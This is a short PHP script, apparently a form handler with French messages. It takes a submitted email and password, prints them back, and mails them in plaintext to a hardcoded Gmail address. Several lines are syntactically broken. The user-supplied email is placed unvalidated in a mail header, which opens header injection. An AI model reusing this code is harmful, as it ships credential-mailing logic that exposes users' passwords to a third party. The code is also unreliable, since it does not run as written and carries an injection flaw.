<?php
$action = $_POST['action'];
$email = $_POST['email'];
$password = $_POST['password'];
if ($action == 'mailer') {


    $message = 'Voici vos identifiants d\'inscription :' . PHP_EOL; "<br/>";
    $message .= 'Email : ' . $email . PHP_EOL "<br/>";
    $message .= 'Mot de passe : ' . PHP_EOL . $password "<br/>";
    echo $message;

    $from = $email;
    $to = "enzovargaspro83520@gmail.com";
    $subject = "test";
    $headers = "De :" . $from;
    mail($to,$subject,$message, $headers);
    echo "L'email a été envoyé.";

}
else {
    echo '<br/><strong>Bouton non géré !</strong><br/>';

}
?>